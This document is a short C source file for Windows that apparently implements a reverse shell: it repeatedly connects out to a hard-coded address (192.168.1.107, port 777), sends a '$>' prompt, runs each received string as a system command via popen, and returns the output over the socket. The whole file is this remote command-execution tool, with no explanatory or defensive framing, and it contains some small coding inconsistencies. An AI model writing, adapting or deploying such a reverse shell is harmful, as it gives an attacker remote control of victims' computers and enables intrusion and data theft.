#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

#define True 1
#define D 256
#define B 1024

	int changeCurrentDirectory(char *string);
	int commandExecute(int s, char *recvbuf);
	int connectSocket(char *ip, int port);

int main(){

	WSADATA wsa;
	int erro = WSAStartup(MAKEWORD(2,2), &wsa);
	if (erro != 0){
		printf("WSAStartup Error: %d\n", erro);
		return 1;
	}

	char *ip = "192.168.1.107";
	int port = 777;

	int s = connectSocket(ip, port);
	
	closesocket(s);

return 0;
}


int connectSocket(char *ip, int port){
	int s;

	while(1){
		printf("Listening...\n");
		s = socket(AF_INET, SOCK_STREAM, 0); 
		if (s == -1){return 1;}
	
		struct sockaddr_in server;
			server.sin_family = AF_INET;
			server.sin_addr.s_addr = inet_addr(ip);
			server.sin_port = htons(port);
	
		if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0){
			closesocket(s);
		}else{
			listening(s);
		}
	}
	return s;
}

int listening(int s){
	char recvbuf[B];
	char *shell = "$>";
	int erro;

	while (True){

		erro = send(s, shell, (int)strlen(shell), 0);
		if (erro < 0){/*printf("Send Error\n");*/return 1;}

		erro = recv(s, recvbuf, B, 0);
		if (erro < 0){/*printf("Recv Error\n");*/return 2;}

		erro = commandExecute(s, recvbuf);	
		if (erro == -1){
			closesocket(s);
			break;
		}

	}
}

int commandExecute(int s, char *recvbuf){
	int status;
	char path[MAX_PATH];
	FILE *fp;

	if (strcmp(recvbuf, "exit\n") == 0){
		return -1;
	}

	if ((strstr(recvbuf, "cd")-recvbuf) == 0){
		changeCurrentDirectory(recvbuf);
	}

	fp = popen(recvbuf, "r");

	while (fgets(path, PATH_MAX, fp) != NULL){
		send(s, path, (int)strlen(path), 0);
	}

	status = pclose(fp);

	if (status == -1) {
		printf("Erro relatado por pclose ()\n");
		return 1;
	} else {
		printf("status : %d\n", status);

	}

	return 0;
}

int changeCurrentDirectory(char *string){
	char *cd, *aux, cwd[D];

	cd = strtok(strchr(string, 32), " ");

	if ((aux=strchr(cd, '\n')) != NULL){ *aux = '\0'; }

	if (chdir(cd) != 0){ return 1; }

	else {
		if (getcwd(cwd, sizeof(cwd)) == NULL){ return 2; }
		else { printf("current working directory is: %s\n", cwd); }
	}

	return 0;
}
